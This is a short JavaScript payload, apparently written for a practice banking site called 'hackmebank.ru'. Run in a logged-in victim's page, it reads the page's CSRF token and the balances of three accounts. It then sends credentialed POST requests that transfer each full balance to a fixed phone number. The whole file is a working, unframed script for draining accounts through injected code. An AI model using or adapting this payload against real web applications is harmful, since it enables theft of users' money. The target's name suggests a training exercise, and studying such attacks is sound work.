function start () {
    let accountFrom = [
        '90107430600220100613', '90107430600220200614', '90107430600220300615'
    ]

    let csrf = document.querySelectorAll('meta')[3].content;
    let balances = document.querySelectorAll('#balances > li');
    let balance = [
        balances[0].innerText.split(' ')[0],
        balances[1].innerText.split(' ')[0],
        balances[2].innerText.split(' ')[0]
    ]
    for (let i = 0; i< balance.length; i++) {
        let address =`https://hackmebank.ru/index.php?r=personal%2Fphone-transfer&account_from=${accountFrom[i]}`;
        let refferer = `https://hackmebank.ru/index.php?r=personal%2Fphone-transfer&account_from=${accountFrom[i]}`;
        let body = `_csrf=${csrf}&PhoneTransferForm%5Baccount_from_number%5D=${accountFrom[i]}&PhoneTransferForm%5Bphone%5D=%2B79157442031&PhoneTransferForm%5Bamount%5D=${balance[i]}&PhoneTransferForm%5Bcomment%5D=`
        fetch(address, {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en,ru-RU;q=0.9,ru;q=0.8,en-US;q=0.7",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "pragma": "no-cache",
                "sec-ch-ua": "\" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"97\", \"Chromium\";v=\"97\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"macOS\"",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1"
            },
            "referrer": refferer,
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": body,
            "method": "POST",
            "mode": "cors",
            "credentials": "include"
        });
    }
};

start();
